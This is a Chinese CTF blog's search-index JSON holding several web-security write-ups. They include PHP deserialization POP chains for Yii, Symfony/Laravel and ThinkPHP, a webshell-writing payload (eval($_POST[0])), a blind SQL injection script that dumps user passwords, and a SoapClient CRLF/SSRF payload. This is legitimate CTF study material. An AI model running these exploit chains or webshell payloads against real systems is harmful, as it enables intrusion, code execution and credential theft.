{"meta":{"title":"月出从云","subtitle":"","description":"","author":null,"url":"http://example.com","root":"/"},"pages":[{"title":"CTF","date":"2020-11-17T05:49:23.000Z","updated":"2020-11-17T06:11:45.482Z","comments":true,"path":"categories/index-1.html","permalink":"http://example.com/categories/index-1.html","excerpt":"","text":""},{"title":"开发","date":"2020-11-17T06:11:43.000Z","updated":"2020-11-17T06:12:00.335Z","comments":true,"path":"categories/index-2.html","permalink":"http://example.com/categories/index-2.html","excerpt":"","text":""},{"title":"渗透","date":"2020-11-17T06:12:08.000Z","updated":"2020-11-17T06:12:21.520Z","comments":true,"path":"categories/index-3.html","permalink":"http://example.com/categories/index-3.html","excerpt":"","text":""},{"title":"search","date":"2020-11-17T06:21:26.000Z","updated":"2020-11-17T06:21:42.054Z","comments":true,"path":"search/index.html","permalink":"http://example.com/search/index.html","excerpt":"","text":""},{"title":"AWD","date":"2014-12-22T04:39:04.000Z","updated":"2020-11-17T06:14:07.642Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"AWD","date":"2020-11-17T06:07:49.000Z","updated":"2020-11-17T06:08:03.116Z","comments":true,"path":"tags/AWD.html","permalink":"http://example.com/tags/AWD.html","excerpt":"","text":""},{"title":"BUU","date":"2020-11-17T06:04:40.000Z","updated":"2020-11-19T12:53:08.536Z","comments":true,"path":"tags/BUU.html","permalink":"http://example.com/tags/BUU.html","excerpt":"","text":""},{"title":"Java","date":"2020-11-17T06:07:36.000Z","updated":"2020-11-17T06:16:38.291Z","comments":true,"path":"tags/Java.html","permalink":"http://example.com/tags/Java.html","excerpt":"","text":""},{"title":"nodejs","date":"2020-11-17T06:18:56.000Z","updated":"2020-11-17T06:19:16.847Z","comments":true,"path":"tags/nodejs.html","permalink":"http://example.com/tags/nodejs.html","excerpt":"","text":""},{"title":"SQL注入","date":"2020-11-17T06:07:24.000Z","updated":"2020-11-17T06:16:34.701Z","comments":true,"path":"tags/SQL注入.html","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5.html","excerpt":"","text":""},{"title":"php","date":"2020-11-17T06:18:09.000Z","updated":"2020-11-17T06:18:40.651Z","comments":true,"path":"tags/php.html","permalink":"http://example.com/tags/php.html","excerpt":"","text":""},{"title":"ssti","date":"2020-11-17T06:06:49.000Z","updated":"2020-11-19T12:52:47.959Z","comments":true,"path":"tags/ssti.html","permalink":"http://example.com/tags/ssti.html","excerpt":"","text":""},{"title":"反序列化","date":"2020-11-17T06:18:43.000Z","updated":"2020-11-17T06:18:51.497Z","comments":true,"path":"tags/反序列化.html","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html","excerpt":"","text":""},{"title":"比赛","date":"2020-11-17T06:07:10.000Z","updated":"2020-11-17T06:16:31.708Z","comments":true,"path":"tags/比赛.html","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B.html","excerpt":"","text":""},{"title":"渗透","date":"2020-11-17T06:09:45.000Z","updated":"2020-11-17T06:16:44.308Z","comments":true,"path":"tags/渗透.html","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F.html","excerpt":"","text":""}],"posts":[{"title":"红帽三个web","slug":"红帽三个web","date":"2021-05-09T10:39:26.000Z","updated":"2021-05-09T12:19:49.697Z","comments":true,"path":"2021/05/09/红帽三个web/","link":"","permalink":"http://example.com/2021/05/09/%E7%BA%A2%E5%B8%BD%E4%B8%89%E4%B8%AAweb/","excerpt":"","text":"find it源码泄露，访问robots.txt,根据提示找到源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123; die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; 会将输入的东西写入hack.php 审计源码可以发现写入内容会被写入到hack.php直接写入?&gt;&lt;?php phpinfo(); //访问hack.php，搜索flag即可 不知道是不是非预期，flag直接在环境里面了 = = framework简单反序列化 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &#x27;file_put_contents(\\&#x27;1.php\\&#x27;,&quot;&lt;?php eval(\\$_POST[0]);&quot;)&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class See&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache&#123; private $keys = []; private $path; public function __construct() &#123; $this-&gt;path = new See; $this-&gt;keys = array( &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;) ); &#125; &#125; // 生成poc echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt; 写入之后执行phpinfo发现ban掉很多函数，利用蚁剑的disable_function 直接绕过即可得到flag websitemanager在image.php 下面直接注入 12345678910111213141516171819202122import requests, string, sysurl = &quot;http://eci-2ze56uon9iidhta1za8c.cloudeci1.ichunqiu.com/image.php&quot;flag = &quot;&quot;for i in range(1, 999): # for j in stringlist: for j in range(40, 126): # sql = &quot;1=(ord(substr(database(),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j) # sql = &quot;1=(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j) sql = &quot;1=(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format( i, j) sql = &quot;1=(ord(substr((select(group_concat(password))from(users)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j) data = &#123;&quot;id&quot;: sql&#125; res = requests.get(url=url, params=data) # print(data) if len(res.text) &gt; 20000: print(j) flag += chr(j-1) print(flag) break if j == 125: sys.exit() 弱智的ssrf","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"fat反序列化挖掘","slug":"fat反序列化挖掘","date":"2021-05-08T13:14:04.000Z","updated":"2021-05-08T13:22:30.833Z","comments":true,"path":"2021/05/08/fat反序列化挖掘/","link":"","permalink":"http://example.com/2021/05/08/fat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8C%96%E6%8E%98/","excerpt":"","text":"自己复现了好几个反序列化的框架漏洞了，自己找个框架练练手，拿fat框架里 12unserialize($_GET[0]);$f3-&gt;run(); 随便添加一些","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"thinkphp5.1","slug":"thinkphp5-1","date":"2021-05-04T05:05:23.000Z","updated":"2021-05-04T08:17:02.176Z","comments":true,"path":"2021/05/04/thinkphp5-1/","link":"","permalink":"http://example.com/2021/05/04/thinkphp5-1/","excerpt":"","text":"感觉自己之前写的文章理解还是不够，所以又来写如果只是单纯的复现很快就会忘掉，所以需要自己多靠自己再来复现，这次是做n1book上的哪个thinkphp5.1. 找入口能够找到windows.php 找到removeFile，看 然后发现任意文件删除，然而我们不仅仅想要做到这个，想想file_exists能够做什么呢？对吧，还可以找toString来继续看，挨个找（这里我只能说提供思路给大家，因为找这个是相当的繁琐和疲惫的事情，如果按照网上的WP的话就很快，但是往往找POP链就是很累），最终能够锁定Conversion.php 跟过去 再跟过去看toArray。将暂时没用的代码折叠掉，我们发现了一个$relation-&gt;visiible 分析这段代码做的事情： 首先重点看看是否可控，首先$name是可控的，$name来自于$this-&gt;append的数组遍历，而该参数我们可以控制，故完全可控 $relation = $this-&gt;getAttr($key)，为此我们需要保证$this-&gt;getRelation($key)返回的内容为空 满足这些条件就可以进入$relation-&gt;visible($name),而name也可以控制，name此时传进去的是一个数组，所以我们全局搜索visible方法，如果不行就找call方法 这里先举出其他call方法为什么不用，例如我们可以先找到一个Cache.php 这里的第一个参数就不可控，其他的很多call函数也是类似 最终我们可以在Request.php下找到 hook完全可控，那么最终我们就可以执行system命令了(原本我是这样想的，结果这就尼玛是前面的一小部分，因为这个该死的array_unshift)，让这个链子长了一倍多！","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"ciscnlaravel","slug":"ciscnlaravel","date":"2021-05-03T08:40:34.000Z","updated":"2021-05-08T03:52:54.089Z","comments":true,"path":"2021/05/03/ciscnlaravel/","link":"","permalink":"http://example.com/2021/05/03/ciscnlaravel/","excerpt":"","text":"思路：两个exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Symfony\\Component\\Cache\\Adapter&#123; use Symfony\\Component\\Cache\\CacheItem; use Symfony\\Component\\Cache\\Traits\\ProxyTrait; use Symfony\\Component\\Cache\\Traits\\PhpArrayTrait; class TagAwareAdapter&#123; use ProxyTrait; private $deferred ; public function __construct($pool) &#123; $this-&gt;pool = $pool; $this-&gt;deferred = [&quot;exp&quot;=&gt;new CacheItem()]; &#125; &#125; class PhpArrayAdapter&#123; use PhpArrayTrait; &#125;&#125;namespace Symfony\\Component\\Cache\\Traits&#123; trait ProxyTrait&#123; private $pool; &#125; trait PhpArrayTrait&#123; private $values = null; private $file = &quot;/flag&quot;; &#125;&#125;namespace Symfony\\Component\\Cache&#123; final class CacheItem&#123; &#125;&#125;namespace &#123; use Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter; use Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter; $phpArray = new PhpArrayAdapter(); $Tagwa = new TagAwareAdapter($phpArray); echo urlencode(serialize($Tagwa));&#125; 这个是包含的，也是市面上大部分的，另外一个是可以命令执行的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpnamespace Symfony\\Component\\Cache\\Adapter&#123; use Symfony\\Component\\Cache\\CacheItem; use Symfony\\Component\\Cache\\Traits\\ProxyTrait; use Symfony\\Component\\Ldap\\Adapter\\ExtLdap\\Adapter; class TagAwareAdapter&#123; use ProxyTrait; private $deferred = []; public function __construct($pool) &#123; $this-&gt;pool = $pool; $this-&gt;deferred = [&quot;ex&quot;=&gt;new CacheItem()]; &#125; &#125; class ProxyAdapter&#123; use ProxyTrait; private $setInnerItem=&quot;system&quot;; &#125;&#125;namespace Symfony\\Component\\Cache\\Traits&#123; use Faker\\DefaultGenerator; trait ProxyTrait&#123; private $pool; private $namespace = &quot;whoami&quot;; public function __construct() &#123; $this-&gt;pool = new DefaultGenerator(); &#125; &#125;&#125;namespace Symfony\\Component\\Cache&#123; final class CacheItem&#123;&#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default = &quot;cat /flag&quot;; &#125;&#125;namespace &#123; use Symfony\\Component\\Cache\\Adapter\\ProxyAdapter; use Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter; $pool = new ProxyAdapter(); $tag = new TagAwareAdapter($pool); echo urlencode(serialize($tag));&#125; 包含的被人讲烂了，这里说说命令执行的这条链。 全局搜索destruct，能够找到 跟进过去很快就可以找到 然后发现调用了一个saveDeferred方法，全局搜索saveDeferred： 找到ProxyAdapter类 跟进doSave方法 这里能够发现很多命令执行的点，但是其实最终落到的地方是 1($this-&gt;setInnerItem)($innerItem, $item); 先说下踩得坑。一开始我一直在找： 1$innerItem = $f($this-&gt;namespace.$item[&quot;\\0*\\0key&quot;], null); 但是这样会遇见一个问题，system 第二个参数如果设置为null，则不会回显内容.. 这样 而我们可以看见这条语句的第二个参数已经锁死为null了，所以无论如何都是没办法执行system的。 但是后来想到其实可以用assert 1assert(&quot;system(&#x27;dir&#x27;);&quot;,null);","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"http://example.com/tags/Laravel/"}]},{"title":"Ezpop_Revenge","slug":"Ezpop-Revenge","date":"2021-05-02T08:47:22.000Z","updated":"2021-05-02T09:00:02.737Z","comments":true,"path":"2021/05/02/Ezpop-Revenge/","link":"","permalink":"http://example.com/2021/05/02/Ezpop-Revenge/","excerpt":"","text":"原本以为是挖day的题目，没想到出奇的比较简单.. 知识点：SoapClient这题目需要利用到原生类SoapClient 进行反序列化，并且到该类调用call方法的时候，就会自动去访问指定的url 1https:&#x2F;&#x2F;www.btis.site&#x2F;2020&#x2F;07&#x2F;13&#x2F;SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&#x2F;#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A 该类无法携带自己的cookies，但是我们通过CRLF便可以成功的控制了，给出的payload如下： 利用代码 1234567&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;btis\\r\\nCookie: PHPSESSID=ctrmmddufre6nph5908ajosbo7\\r\\n&quot;, &#x27;uri&#x27; =&gt; &quot;123&quot;));$payload = urlencode(serialize($attack));echo $payload; 思路先找能够输入的地方，全局搜索unserialize,在Plugin中找到.. 再之后发现出题人自定义的写了一个类， 1234567class HelloWorld_DB&#123; private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;; private $coincidence; function __wakeup()&#123; $db = new Typecho_Db($this-&gt;coincidence[&#x27;hello&#x27;], $this-&gt;coincidence[&#x27;world&#x27;]); &#125;&#125; 肯定有用，跟过去看看Tyecho_Db类。 1234567891011 public function __construct($adapterName, $prefix = &#x27;typecho_&#x27;) &#123; /** 获取适配器名称 */ $this-&gt;_adapterName = $adapterName; /** 数据库适配器 */ $adapterName = &#x27;Typecho_Db_Adapter_&#x27; . $adapterName;#TODO: 给出提示 if (!call_user_func(array($adapterName, &#x27;isAvailable&#x27;))) &#123; throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);//__toString() &#125; 发现让我们找一个__toString，全局搜索 挨个找，Feed的没啥用，没有能够调用call的地方，config的更没用了，，看到Query.php里面的 123456switch ($this-&gt;_sqlPreBuild[&#x27;action&#x27;]) &#123; case Typecho_Db::SELECT: return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild); case Typecho_Db::INSERT: return &#x27;INSERT INTO &#x27; . $this-&gt;_sqlPreBuild[&#x27;table&#x27;] 这里看看adapter是否可控，跟转之后就会发现该属性完全可控，那么接着控制_adapter 位soapClient类即可。 拼凑payload： ssrf的代码借鉴了y1ng师傅的。。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpclass HelloWorld_DB&#123; private $coincidence; function __construct() &#123; $this-&gt;coincidence[&#x27;hello&#x27;] = new Typecho_Db_Query(); &#125; function __wakeup()&#123; $db = new Typecho_Db($this-&gt;coincidence[&#x27;hello&#x27;], $this-&gt;coincidence[&#x27;world&#x27;]); &#125;&#125;class Typecho_Db_Query&#123; private $_adapter; private $_sqlPreBuild; function __construct()&#123; $target = &quot;http://127.0.0.1/flag.php&quot;; $post_string = &#x27;admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#x27;. &quot;\\r\\n&quot;; $headers = [ &#x27;X-Forwarded-For:127.0.0.1&#x27;, &quot;Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rm4&quot; ]; $this-&gt;_adapter = new SoapClient(null, array(&#x27;uri&#x27; =&gt; &#x27;aaab&#x27;, &#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &#x27;Y1ng^^&#x27; . join(&#x27;^^&#x27;, $headers))); $this-&gt;_sqlPreBuild[&#x27;action&#x27;]= &#x27;SELECT&#x27;; &#125;&#125;function decorate($str)&#123; $arr = explode(&#x27;:&#x27;, $str); $newstr = &#x27;&#x27;; for ($i = 0; $i &lt; count($arr); $i++) &#123; if (preg_match(&#x27;/00/&#x27;, $arr[$i])) &#123; $arr[$i - 2] = preg_replace(&#x27;/s/&#x27;, &quot;S&quot;, $arr[$i - 2]); &#125; &#125; $i = 0; for (; $i &lt; count($arr) - 1; $i++) &#123; $newstr .= $arr[$i]; $newstr .= &quot;:&quot;; &#125; $newstr .= $arr[$i]; return $newstr;&#125;$y1ng = serialize(new HelloWorld_DB());$y1ng = preg_replace(&quot; /\\^\\^/&quot;, &quot;\\r\\n&quot;, $y1ng);$urlen = urlencode($y1ng);$urlen = preg_replace(&#x27;/%00/&#x27;, &#x27;%5c%30%30&#x27;, $urlen);$y1ng = decorate(urldecode($urlen));echo base64_encode($y1ng); 根据flag.php，最终结果被打印到了$session里面所以我们要穿自己的sesion过去 123456&lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&quot;127.0.0.1&quot;)&#123; $_SESSION[&#x27;flag&#x27;]= &quot;MRCTF&#123;******&#125;&quot;;&#125;else echo &quot;我扌your problem?\\nonly localhost can get flag!&quot;;?&gt;","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"web5","slug":"web5","date":"2021-05-01T13:41:06.000Z","updated":"2021-05-01T13:56:11.199Z","comments":true,"path":"2021/05/01/web5/","link":"","permalink":"http://example.com/2021/05/01/web5/","excerpt":"","text":"没想到反序列化还可以这样操作，学习到了奥 开局能找出源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345&lt;?phpsession_start();ini_set(&#x27;max_execution_time&#x27;, &#x27;5&#x27;);set_time_limit(5);$status = &quot;new&quot;;$cmd = &quot;whoami&quot;;$is_upload = false;$is_unser_finished = false;$iscc_file = NULL;class ISCC_Upload &#123; function __wakeup() &#123; global $cmd; global $is_upload; $cmd = &quot;whoami&quot;; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = (count($_FILES) &gt; 0); &#125; function __destruct() &#123; global $is_upload; global $status; global $iscc_file; $status = &quot;upload_fail&quot;; if ($is_upload) &#123; foreach ($_FILES as $key =&gt; $value) $GLOBALS[$key] = $value; if(is_uploaded_file($iscc_file[&#x27;tmp_name&#x27;])) &#123; $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]); if($check !== false) &#123; $target_dir = &quot;/var/tmp/&quot;; $target_file = $target_dir . randstr(10); if (file_exists($target_file)) &#123; echo &quot;想啥呢？有东西了……&lt;br&gt;&quot;; finalize(); exit; &#125; if ($iscc_file[&quot;size&quot;] &gt; 500000) &#123; echo &quot;东西塞不进去~&lt;br&gt;&quot;; finalize(); exit; &#125; if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) &#123; echo &quot;我拿到了！&lt;br&gt;&quot;; $iscc_file = $target_file; $status = &quot;upload_ok&quot;; &#125; else &#123; echo &quot;拿不到:(&lt;br&gt;&quot;; finalize(); exit; &#125; &#125; else &#123; finalize(); exit; &#125; &#125; else &#123; echo &quot;你真是个天才!&lt;br&gt;&quot;; finalize(); exit; &#125; &#125; &#125;&#125;class ISCC_ResetCMD &#123; protected $new_cmd = &quot;echo &#x27;新新世界，发号施令!&#x27;&quot;; function __wakeup() &#123; global $cmd; global $is_upload; global $status; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = false; if(!isset($this-&gt;new_cmd)) &#123; $status = &quot;error&quot;; $error = &quot;你这罐子是空的!&quot;; throw new Exception($error); &#125; if(!is_string($this-&gt;new_cmd)) &#123; $status = &quot;error&quot;; $error = &#x27;东西都没给对!&#x27;; throw new Exception($error); &#125; &#125; function __destruct() &#123; global $cmd; global $status; $status = &quot;reset&quot;; if($_SESSION[&#x27;name&#x27;] === &#x27;isccIsCciScc1scc&#x27;) &#123; $cmd = $this-&gt;new_cmd; &#125; &#125;&#125;class ISCC_Login &#123; function __wakeup() &#123; $this-&gt;login(); &#125; function __destruct() &#123; $this-&gt;logout(); &#125; function login() &#123; $flag = file_get_contents(&quot;/flag&quot;); $pAssM0rd = hash(&quot;sha256&quot;, $flag); if($_GET[&#x27;pAssM0rd&#x27;] === $pAssM0rd) $_SESSION[&#x27;name&#x27;] = &quot;isccIsCciScc1scc&quot;; &#125; function logout() &#123; global $status; unset($_SESSION[&#x27;name&#x27;]); $status = &quot;finish&quot;; &#125;&#125;class ISCC_TellMeTruth &#123; function __wakeup() &#123; if(!isset($_SESSION[&#x27;name&#x27;])) $_SESSION[&#x27;name&#x27;] = randstr(14); echo &quot;似乎这个 &quot;.$_SESSION[&#x27;name&#x27;].&quot; 是真相&lt;br&gt;&quot;; &#125; function __destruct() &#123; echo &quot;似乎这个 &quot;.$_SESSION[&#x27;name&#x27;].&quot; 是真相&lt;br&gt;&quot;; &#125;&#125;class ISCC_Command &#123; function __wakeup() &#123; global $cmd; global $is_upload; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = false; $cmd = &quot;whoami&quot;; &#125; function __toString() &#123; global $cmd; return &quot;看看你干的好事: &#123;$cmd&#125; &lt;br&gt;&quot;; &#125; function __destruct() &#123; global $cmd; global $status; global $is_unser_finished; $status = &quot;cmd&quot;; if($is_unser_finished === true) &#123; echo &quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;&#123;$cmd&#125;&lt;/span&gt;] 弄出了什么后果: &quot;; echo &quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;; @system($cmd); echo &quot;&lt;/span&gt;&quot;; &#125; &#125;&#125;function randstr($len)&#123; $characters = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;; $randstring = &#x27;&#x27;; for ($i = 0; $i &lt; $len; $i++) &#123; $randstring .= $characters[rand(0, strlen($characters))]; &#125; return $randstring;&#125;function waf($s) &#123; if(stripos($s, &quot;*&quot;) !== FALSE) return false; return true;&#125;function finalize() &#123; $cmd = &quot;&quot;; $is_upload = false; unset($_SESSION); @unlink($iscc_file); $status = &quot;finish&quot;; echo &quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;;&#125;if(isset($_GET[&#x27;whatareyounongshane&#x27;])) &#123; $whatareyounongshane = $_GET[&#x27;whatareyounongshane&#x27;]; switch ($whatareyounongshane) &#123; case &quot;src&quot;: highlight_file(__FILE__); break; case &quot;cmd&quot;: echo &quot;想越级干好事？还是有门的……&quot;; header(&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;); break; case &quot;reset&quot;: echo &quot;几辈子积累的好运就在这时~:p&quot;; header(&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;); break; case &quot;upload&quot;: $resp = &lt;&lt;&lt;EOF&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;EOF; echo $resp; break; case &quot;tellmetruth&quot;: echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;); header(&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;); break; default: echo &quot;空空如也就是我！&quot;; &#125; finalize(); die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);&#125;if(isset($_GET[&#x27;?&#x27;])) &#123; $wtf = waf($_GET&#123;&#x27;?&#x27;&#125;) ? $_GET[&#x27;?&#x27;] : (finalize() &amp;&amp; die(&quot;试试就“逝世”!&quot;)); if($goodshit = @unserialize($wtf)) &#123; $is_unser_finished = true; &#125; if(in_array($status, array(&#x27;new&#x27;, &#x27;cmd&#x27;, &#x27;upload_ok&#x27;, &#x27;upload_fail&#x27;, &#x27;reset&#x27;), true)) finalize(); die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);&#125;?&gt;&lt;head&gt; &lt;title&gt;ISCC finder system - which is the true ISCC&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; canvas &#123; display: block; &#125; #snowfall &#123; width: 100%; height: 100vh; background: cornflowerblue; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;!--████████████▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████████▒▒████████████▒▒▒▒████████████████▒▒▒▒▒▒▒▒▒▒▒▒██████████████████▒▒▒▒▒▒▒▒██████████████████▒▒▒▒████▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒████████▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒████████▒▒▒▒▒▒▒▒▒▒██▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒████████▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒